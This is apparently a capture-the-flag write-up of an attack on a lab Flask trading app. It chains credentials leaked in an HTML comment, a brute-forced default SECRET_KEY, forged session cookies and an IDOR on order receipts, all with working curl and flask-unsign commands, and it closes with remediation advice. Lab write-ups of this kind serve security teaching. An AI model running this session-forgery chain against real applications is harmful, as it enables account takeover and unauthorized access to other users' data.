## Target

- **URL:** `http://host.containers.internal:32770`
- **Stack:** Apache/2.4.67 (Debian) reverse proxy, Flask application backend
- **Description:** A trading platform web application with a two-step login flow, order management dashboard, and receipt viewing system.

## Reconnaissance

### Step 1: Source Code Analysis

The landing page is a login form. Inspecting the raw HTML response revealed a developer TODO comment left in production:

```html
<!-- TODO: Delete the testing account (test:test). -->
```

Hardcoded credentials in plaintext. The first vulnerability.

### Step 2: Authentication Flow Mapping

The login is a two-step process:

1. **POST** `username` to `/` -- server looks up the user, redirects to `/password/<username>`
2. **GET** `/password/<username>` -- returns a form with hidden fields `username` and `user_id` (value: `10032` for user `test`), plus a password input
3. **POST** `username`, `user_id`, `password` to `/password/<username>` -- server validates password, sets Flask session cookie, redirects to `/dashboard`

Authenticating with `test:test` succeeds. The session cookie is Flask-signed:

```
eyJ1c2VyX2lkIjoxMDAzMn0.ajhIOw.T_mi7vGRaYN1E8syJJWJYUrQO3s
```

Decoded payload: `{"user_id": 10032}`

### Step 3: Application Surface Mapping

Authenticated pages:
- `/dashboard?username=test` -- Dashboard with "Welcome, John Doe"
- `/orders` -- Active orders table (order IDs: 300123, 300214, 300327)
- `/orders_archive` -- Archived orders table (order IDs: 300123, 300481)
- `/order/<order_id>/receipt` -- Receipt modal content (AJAX-loaded)
- `/order/<order_id>/archive` -- Archives an order (moves from orders to orders_archive)
- `/logout` -- Logout

## Vulnerability Chain

### Vulnerability 1: Hardcoded Credentials (Information Disclosure)

**Severity:** Low (entry point)
**Location:** HTML source of login page
**Evidence:** `<!-- TODO: Delete the testing account (test:test). -->`

Provided initial access to the authenticated application surface.

### Vulnerability 2: Weak Flask SECRET_KEY (Session Forgery)

**Severity:** Critical
**Location:** Flask application configuration
**Evidence:** `SECRET_KEY = 'your_secret_key'` (default placeholder value)

The Flask session cookie is signed using `itsdangerous` with the application's `SECRET_KEY`. If the key is weak or known, an attacker can forge arbitrary session cookies.

**Exploitation:**

Used `flask-unsign` to brute-force the secret key against the captured session cookie:

```bash
flask-unsign --unsign \
  --cookie 'eyJ1c2VyX2lkIjoxMDAzMn0.ajhIOw.T_mi7vGRaYN1E8syJJWJYUrQO3s' \
  --wordlist /tmp/big_secrets.txt \
  --no-literal-eval
```

Result:

```
[+] Found secret key after 128 attempts
b'your_secret_key'
```

The wordlist included common/default Flask secret keys. `your_secret_key` is a well-known placeholder.

**Session Forgery:**

```bash
flask-unsign --sign --cookie '{"user_id": 1}' --secret 'your_secret_key'
```

Output: `eyJ1c2VyX2lkIjoxfQ.ajhJ3w.GmFY3ZYqK97aBI-pT8b7oPUKF4c`

This cookie authenticates as `user_id=1` without knowing that user's password.

### Vulnerability 3: Insecure Direct Object Reference (IDOR)

**Severity:** High
**Location:** Order receipt endpoint (`/order/<order_id>/receipt`)
**Evidence:** Forged session with `user_id=1` accessed order `300198`, which belonged to a different user.

The application uses `user_id` from the session cookie to determine which orders to display and which receipts to serve. By forging a session with an arbitrary `user_id`, an attacker can access any user's orders and receipts.

## Exploitation

### Full Attack Chain

```
1. Read HTML source -> find test:test credentials
2. Login as test -> capture Flask session cookie
3. Decode cookie -> {"user_id": 10032}
4. Brute-force SECRET_KEY with flask-unsign -> "your_secret_key"
5. Forge session with user_id=1 -> new cookie
6. Access /orders with forged cookie -> order 300198
7. GET /order/300198/receipt -> FLAG{We_keep_progressing}
```

### Commands

```bash
# Step 1: Discover credentials
curl -s http://host.containers.internal:32770/ | grep 'TODO'

# Step 2: Login and capture session
curl -s -i -X POST -d 'username=test' http://host.containers.internal:32770/
curl -s -i -X POST -d 'username=test&user_id=10032&password=test' \
  http://host.containers.internal:32770/password/test

# Step 3: Decode session
echo 'eyJ1c2VyX2lkIjoxMDAzMn0' | base64 -d
# Output: {"user_id":10032}

# Step 4: Brute-force secret key
flask-unsign --unsign \
  --cookie 'eyJ1c2VyX2lkIjoxMDAzMn0.ajhIOw.T_mi7vGRaYN1E8syJJWJYUrQO3s' \
  --wordlist secrets.txt --no-literal-eval
# Output: Found secret key: b'your_secret_key'

# Step 5: Forge session for user_id=1
FORGED=$(flask-unsign --sign --cookie '{"user_id": 1}' --secret 'your_secret_key')

# Step 6: Access orders as user_id=1
curl -s -b "session=$FORGED" http://host.containers.internal:32770/orders

# Step 7: Read receipt containing flag
curl -s -b "session=$FORGED" \
  http://host.containers.internal:32770/order/300198/receipt
```

### Flag

```
FLAG{We_keep_progressing}
```

Found in the receipt body for order `300198`, belonging to `user_id=1`:

```html
<code class="text-white">FLAG{We_keep_progressing}</code>
```

## Remediation

| Vulnerability | Fix |
|---------------|-----|
| Hardcoded credentials | Remove test accounts from production. Never store credentials in source code or HTML comments. |
| Weak SECRET_KEY | Generate a cryptographically random secret (e.g., `secrets.token_hex(32)`). Never use default placeholder values. |
| IDOR | Implement server-side authorization checks. Verify that the authenticated user owns or is authorized to access the requested resource. Do not rely solely on `user_id` in the session for access control without ownership validation. |

## Tools Used

- `curl` -- HTTP requests and response inspection
- `flask-unsign` -- Flask session cookie decoder, brute-forcer, and signer
- `base64` -- Session payload decoding
- Custom wordlist -- Common Flask secret key values

## Notes

- The application uses parameterized queries for login (SQL injection failed on all fields).
- The `user_id` hidden form field in the password step is ignored by the server -- the session always uses the `user_id` from the database lookup.
- The archive endpoint (`/order/<id>/archive`) has a separate IDOR vulnerability: any authenticated user can archive any other user's orders. This was not required for the flag but represents an additional finding.
- `user_id=0` redirects to login (invalid user). `user_id=1` is the first valid user with order data.
- The Flask `SECRET_KEY` `your_secret_key` is a commonly seen default in tutorials and boilerplate code. It was found after 128 attempts in a custom wordlist of common/default secrets.
